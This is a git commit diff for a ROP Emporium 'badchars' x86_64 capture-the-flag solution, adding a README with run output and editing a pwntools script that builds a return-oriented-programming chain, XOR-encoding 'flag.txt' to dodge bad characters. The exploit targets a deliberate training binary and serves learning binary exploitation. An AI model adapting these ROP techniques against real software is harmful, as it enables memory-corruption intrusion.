cdb33ffc2aaed9fdcb67de71be5a97f1616970a1
geoffrey <geoffrey@geoffrey>
2025-03-08 18:55:32 +0100

    badchars x86_64

---
+++ 05_badchars/x86_64/README.md
@@ -0,0 +1,10 @@
+# [badchars](https://ropemporium.com/challenge/badchars.html)
+
+[Solve](./solve.py) :
+
+```console
+$ python3 solve.py 
+[+] Starting local process './badchars': pid 20321
+Flag : b'ROPE{a_placeholder_32byte_flag!}\n'
+[*] Stopped process './badchars' (pid 20321)
+```
--- 05_badchars/x86_64/solve.py
+++ 05_badchars/x86_64/solve.py
@@ -1,6 +1,6 @@
 from pwn import *
 
-data = 0x00601028 # rw-
+data = 0x00601030 # rw-
 print_file = 0x00400510 # plt
 mov_qword = 0x00400634 # mov qword ptr [r13], r12 ; ret
 pop_rdi = 0x004006a3 # pop rdi ; ret
@@ -8,9 +8,8 @@ pop_r12_r13_r14_r15 = 0x0040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
 pop_r14_r15 = 0x004006a0 # pop r14 ; pop r15 ; ret
 pop_r15 = 0x0004006a2 # pop r15 ; ret
 xor_r15_r14 = 0x00400628 # xor byte ptr [r15], r14b ; ret
-file = bytes([ i^0x33 for i in b"flag.txt" ])
-
-print(file)
+key = 0x2
+file = bytes([ i^key for i in b"flag.txt" ])
 
 # Writing encoded filename in data
 payload = b"".join([
@@ -25,7 +24,7 @@ payload = b"".join([
 # Decoding the filename
 payload += b"".join([
     p64(pop_r14_r15),
-    p64(0x33),
+    p64(key),
     p64(data),
     p64(xor_r15_r14),
 ])
@@ -44,7 +43,10 @@ payload += b"".join([
 ])
 
 p = process("./badchars")
-input("Waiting for debug")
+#input("Waiting for debug")
 p.send(payload+b"\n")
 
-p.interactive()
+#p.interactive()
+p.recvuntil(b"you!\n")
+flag = p.recv()
+print(f"Flag : {flag}")
